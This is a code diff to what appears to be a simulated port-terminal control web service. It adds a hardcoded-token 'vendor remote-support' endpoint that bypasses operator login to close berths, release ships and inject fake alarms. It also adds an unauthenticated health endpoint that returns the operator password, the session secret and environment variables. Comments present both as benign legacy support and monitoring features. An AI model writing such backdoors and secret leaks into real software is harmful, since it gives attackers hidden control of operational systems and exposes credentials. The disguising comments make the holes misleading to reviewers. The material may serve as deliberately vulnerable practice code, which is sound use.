@@ -310,6 +310,73 @@ async def cmd_expedite(payload: dict, user: dict = Depends(require_csrf)) -> JSO
     return JSONResponse(await sim.expedite_ship(ship_id, actor=user["u"]))
 
 
+# ── vendor remote-support API ──────────────────────────────────────────────
+# Legacy diagnostic interface shipped by the terminal control vendor for
+# outage support. Token-authenticated, bypasses operator login. Left
+# enabled in the field because the vendor's monitoring tools still call
+# it for unattended remediation.
+
+SERVICE_TOKEN = "PORT-SVC-9c2f4e1a-LEGACY"
+
+
+def require_service_token(
+    x_service_token: Optional[str] = Header(default=None, alias="X-Service-Token"),
+) -> None:
+    if not x_service_token or not compare_digest(x_service_token, SERVICE_TOKEN):
+        raise HTTPException(status_code=403, detail="invalid service token")
+
+
+@app.post("/api/svc/exec")
+async def svc_exec(
+    payload: dict,
+    _: None = Depends(require_service_token),
+) -> JSONResponse:
+    action = str(payload.get("action", ""))
+    actor = str(payload.get("actor", "svc"))[:32] or "svc"
+    if action == "close_berth":
+        try:
+            berth_id = int(payload.get("berth_id"))
+        except (TypeError, ValueError):
+            raise HTTPException(status_code=400, detail="berth_id must be int")
+        return JSONResponse(await sim.force_close_berth(berth_id, actor=actor))
+    if action == "release_ship":
+        ship_id = str(payload.get("ship_id", ""))
+        return JSONResponse(await sim.force_release_ship(ship_id, actor=actor))
+    if action == "ack_alarm":
+        key = str(payload.get("key", ""))
+        return JSONResponse(await sim.acknowledge_alarm(key, actor=actor))
+    if action == "inject_alarm":
+        text = str(payload.get("text", "diagnostic alarm"))[:200]
+        level = str(payload.get("level", "warn"))
+        return JSONResponse(await sim.inject_alarm(text, level, actor=actor))
+    raise HTTPException(status_code=400, detail="unknown action")
+
+
+# ── extended diagnostic probe ──────────────────────────────────────────────
+# Verbose health endpoint kept on for the deployment's monitoring stack.
+# Returns full runtime configuration so the monitoring agent can confirm
+# the service came up with the expected parameters.
+
+@app.get("/_health")
+async def _health_verbose() -> JSONResponse:
+    return JSONResponse({
+        "status": "ok",
+        "tick": sim.tick,
+        "uptime_seconds": int(time.time() - sim.started_at),
+        "config": {
+            "site_name": PORT_SITE_NAME,
+            "operator_username": PORT_OPERATOR_USERNAME,
+            "operator_password": PORT_OPERATOR_PASSWORD,
+            "session_secret": PORT_SESSION_SECRET,
+            "tick_seconds": PORT_TICK_SECONDS,
+            "berths": PORT_BERTHS,
+            "cranes_per_berth": PORT_CRANES_PER_BERTH,
+            "crane_cycle_ticks": PORT_CRANE_CYCLE_TICKS,
+        },
+        "env": {k: v for k, v in os.environ.items() if k.startswith("PORT_")},
+    })
+
+
 # ── websocket live feed ─────────────────────────────────────────────────────
 
 @app.websocket("/ws/state")
